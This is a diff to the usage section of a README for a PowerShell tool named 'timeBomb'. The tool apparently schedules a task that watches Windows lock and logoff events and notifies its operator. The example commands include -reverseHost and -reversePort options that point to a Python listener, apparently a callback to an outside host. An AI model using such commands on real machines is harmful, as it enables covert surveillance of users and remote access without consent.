@@ -104,7 +104,14 @@ Information: In windows server 2008 events 4800/4801/4802/4803 are not created w
 
 ### Usage
 
-The task is going to run now.
+
+The task is going to run now
+```
+PS> timeBomb -task now -newest <give a big number>
+PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number>
+```
+
+The task is going to run now and if the user is logged of or if the screen saver is invoked then you will get a message.
 ```
 PS> timeBomb -task now -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
